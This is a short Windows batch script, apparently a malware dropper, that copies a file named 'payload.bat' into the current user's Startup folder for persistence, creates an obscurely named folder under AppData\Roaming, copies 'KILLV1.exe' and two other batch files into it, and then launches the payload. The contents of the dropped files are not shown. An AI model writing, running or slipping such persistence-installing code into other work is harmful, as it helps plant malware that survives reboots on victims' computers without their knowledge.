@echo off
title startup script
copy "payload.bat" C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\
if not exist "C:\Users\%USERNAME%\AppData\Roaming\Jurgwem" mkdir C:\Users\%USERNAME%\AppData\Roaming\Jurgwem
copy "KILLV1.exe" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
copy "cleaner.bat" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
copy "debug.bat" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
start C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\payload.bat
exit